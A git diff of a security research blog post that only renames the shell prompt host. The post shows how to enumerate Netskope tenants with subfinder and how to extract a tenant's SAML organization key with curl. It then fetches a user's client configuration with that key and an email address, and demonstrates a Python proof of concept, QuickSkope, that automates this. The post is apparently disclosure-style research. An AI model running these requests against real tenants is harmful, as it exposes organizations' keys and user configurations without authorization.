@@ -73,7 +73,7 @@ In the documentation, there are a few domains that pique our interest:
 We used the structure of these domains to identify tenants using Netskope. This can be done by utilizing a subdomain discovery tool to uncover valid subdomains associated with goskope.com. We are going to use [subfinder](https://github.com/projectdiscovery/subfinder) created by ProjectDiscovery to passively check for any valid subdomains running under goskope.com. 
 
 ```bash
-tjnull@conops:$ subfinder -d goskope.com 
+tjnull@kali:$ subfinder -d goskope.com 
 
                __    _____           __         
    _______  __/ /_  / __(_)___  ____/ /__  _____
@@ -91,7 +91,7 @@ tjnull@conops:$ subfinder -d goskope.com
 As of this writing, we identified a total of 1062 subdomains that were associated with goskope.com. Since we are looking for certain subdomains that are tied to the tenant, we can utilize grep to filter out the results by running the following command:
 
 ```bash
-tjnull@conops:$ subfinder -d goskope.com | grep -E 'nsauth|vpn-|gateway-' | sort -u > filtered_domains.txt
+tjnull@kali:$ subfinder -d goskope.com | grep -E 'nsauth|vpn-|gateway-' | sort -u > filtered_domains.txt
 
                __    _____           __         
    _______  __/ /_  / __(_)___  ____/ /__  _____
@@ -116,7 +116,7 @@ The nsauth-<tenant>[.region].goskope.com domain is specifically used to manage t
 Now that we have obtained a list of tenants, we can leverage the nsauth domain and URL to extract the Organization’s SAML key. Below is an example of requesting the key:
 
 ```bash
-tjnull@conops:$ curl -s -X POST "https://nsauth-<tenant-name>.goskope.com/nsauth/client/authenticate" \ -d "TenantName=<tenant-name>&UTCEpoch=$(date +%s)" \ --connect-timeout 10 --retry 3 --retry-delay 5 --fail
+tjnull@kali:$ curl -s -X POST "https://nsauth-<tenant-name>.goskope.com/nsauth/client/authenticate" \ -d "TenantName=<tenant-name>&UTCEpoch=$(date +%s)" \ --connect-timeout 10 --retry 3 --retry-delay 5 --fail
 
 
 <html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
@@ -149,7 +149,7 @@ tjnull@conops:$ curl -s -X POST "https://nsauth-<tenant-name>.goskope.com/nsauth
 The SAML request is base64 encoded and the data we need to identify the organization key is in there. We can decode the data in the key by adding a few commands to our curl request: 
 
 ```bash
-tjnull@conops:$ curl -s https://nsauth-<tenant-name>.goskope.com/nsauth/client/authenticate -d "TenantName=<tenant-name>&UTCEpoch=$(date +%s)"| grep 'SAMLRequest' | cut -d '"' -f6 | base64 -d
+tjnull@kali:$ curl -s https://nsauth-<tenant-name>.goskope.com/nsauth/client/authenticate -d "TenantName=<tenant-name>&UTCEpoch=$(date +%s)"| grep 'SAMLRequest' | cut -d '"' -f6 | base64 -d
 
 <samlp:AuthnRequest xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="NSAUTH_bc703b85fe2c89051e75d8234685598428cb7bba85a2ab3dcebe2c4a8c838bec" Version="2.0" ForceAuthn="false" IsPassive="false" IssueInstant="2024-08-26T16:08:00Z" Destination="https://samltest.<tenant-name>.com/adfs/ls" ProtocolBinding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST" AssertionConsumerServiceURL="https://nsauth-<tenant-name>.goskope.com/nsauth/saml2/http-post/<ORGANIZATION-KEY>/acs">
     <saml:Issuer>https://nsauth-<tenant-name>.goskope.com/<ORGANIZATION-KEY></saml:Issuer>
@@ -218,14 +218,14 @@ function myFunction() {
 Now that we've obtained the tenant's Organization Key, we can use it to acquire the user's configuration file by supplying a valid email address in a request to the tenant's associated goskope domain. This request can be made using curl as follows:
 
 ```
-tjnull@conops:$ curl 'https://addon-<tenant-name>.goskope.com/config/user/getbrandingbyemail?orgkey=<ORGANIZATION-KEY>&email=<EMAIL ADDRESS>'
+tjnull@kali:$ curl 'https://addon-<tenant-name>.goskope.com/config/user/getbrandingbyemail?orgkey=<ORGANIZATION-KEY>&email=<EMAIL ADDRESS>'
 {"AddonCheckerHost":"achecker-<tenant-name>.goskope.com","AddonCheckerResponseCode":"netSkope@netSkope","AddonManagerHost":"addon-<tenant-name>.goskope.com","EncryptBranding":false,"OrgKey":"ORGANIZATION KEY","OrgName":"<tenant-name>","SFCheckerHost":"sfchecker.goskope.com","SFCheckerIP":"8.8.8.8","UserEmail":"EMAIL","UserKey":"USER KEY","ValidateConfig":false,"tenantID":"TENANT ID IN NUMBERS"}
 ```
 
 If the email address provided is not valid, you will encounter an error that resembles the following:
 
 ```bash
-tjnull@conops:$ curl 'https://addon-<tenant>.goskope.com/config/user/getbrandingbyemail?orgkey=<ORGKEY>&email=<EMAIL ADDRESS>'
+tjnull@kali:$ curl 'https://addon-<tenant>.goskope.com/config/user/getbrandingbyemail?orgkey=<ORGKEY>&email=<EMAIL ADDRESS>'
 {"message":"Unable to find user with email <EMAIL ADDRESS>","status":"error"}
 ```
 
@@ -253,7 +253,7 @@ QuickSkope is a proof of concept (POC) based on python that is designed to strea
 Using Quick-Skope is very easy:
 
 ```bash
-tjnull@conops:~/Documents/scripts/quick-skope$ python quick-scope.py
+tjnull@kali:~/Documents/scripts/quick-skope$ python quick-scope.py
 
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⣤⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⣿⠟⠉⠉⠻⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
@@ -311,16 +311,16 @@ no-banner                           - Suppresses the ASCII banner.
 To validate if there is an actual tenant we can run the following options:
 
 ```bash
-tjnull@conops:~/Documents/scripts/quick-skope$ python quick-scope.py no-banner validate <tenant-name>
+tjnull@kali:~/Documents/scripts/quick-skope$ python quick-scope.py no-banner validate <tenant-name>
 
 Tenant "TENANT NAME" valid. OrgKey = "Organization Key"
 
-tjnull@conops:~/Documents/scripts/quick-skope$
+tjnull@kali:~/Documents/scripts/quick-skope$
 ```
 If the script runs successfully, it will display the organization's key for the specified tenant. To obtain a user configuration file we can run the following options:
 
 ```bash
-tjnull@conops:~/Documents/scripts/quick-skope$ python quick-scope.py no-banner config <tenant_name> <email>
+tjnull@kali:~/Documents/scripts/quick-skope$ python quick-scope.py no-banner config <tenant_name> <email>
 Client configuration file obtained successfully! Saving file as nsbranding.json
 
 Delete all the files in the following directory and copy nsbranding.json into it.
